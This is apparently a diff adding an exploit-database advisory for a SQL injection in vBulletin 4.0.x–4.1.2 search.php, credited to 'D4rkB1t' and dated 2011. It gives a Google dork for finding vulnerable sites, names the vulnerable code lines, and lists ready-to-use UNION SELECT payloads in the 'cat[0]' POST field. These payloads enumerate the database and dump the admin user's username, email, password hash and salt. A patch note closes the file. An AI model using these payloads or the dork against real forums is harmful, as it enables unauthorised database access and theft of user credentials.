@@ -1,0 +1,50 @@
+====================================================================
+#vBulletin  4.0.x => 4.1.2 (search.php) SQL Injection Vulnerability#
+====================================================================
+#                                                                  #
+#         888     d8          888   _   888          ,d   d8       #
+#    e88~\888    d88   888-~\ 888 e~ ~  888-~88e  ,d888 _d88__     #
+#   d888  888   d888   888    888d8b    888  888b   888  888       #
+#   8888  888  / 888   888    888Y88b   888  8888   888  888       #
+#   Y888  888 /__888__ 888    888 Y88b  888  888P   888  888       #
+#    "88_/888    888   888    888  Y88b 888-_88"    888  "88_/     #
+#                                                                  #
+====================================================================
+#PhilKer - PinoyHack - RootCON - GreyHat Hackers - Security Analyst#
+====================================================================
+
+#[+] Discovered By   : D4rkB1t
+#[+] Site            : NaN
+#[+] support e-mail  : d4rkb1t@live.com
+
+
+Product: http://www.vbulletin.com
+Version: 4.0.x
+Dork : inurl:"search.php?search_type=1"
+
+--------------------------
+#   ~Vulnerable Codes~   #
+--------------------------
+/vb/search/searchtools.php - line 715;
+/packages/vbforum/search/type/socialgroup.php - line 201:203;
+
+--------------------------
+#        ~Exploit~       #
+--------------------------
+POST data on "Search Multiple Content Types" => "groups"
+
+&cat[0]=1) UNION SELECT database()#
+&cat[0]=1) UNION SELECT table_name FROM information_schema.tables#
+&cat[0]=1) UNION SELECT concat(username,0x3a,email,0x3a,password,0x3a,salt) FROM user WHERE userid=1#
+
+More info: http://j0hnx3r.org/?p=818
+
+--------------------------
+#        ~Advice~        #
+--------------------------
+Vendor already released a patch on vb#4.1.3.
+UPDATE NOW!
+
+====================================================================
+# 1337day.com [2011-5-21]
+====================================================================
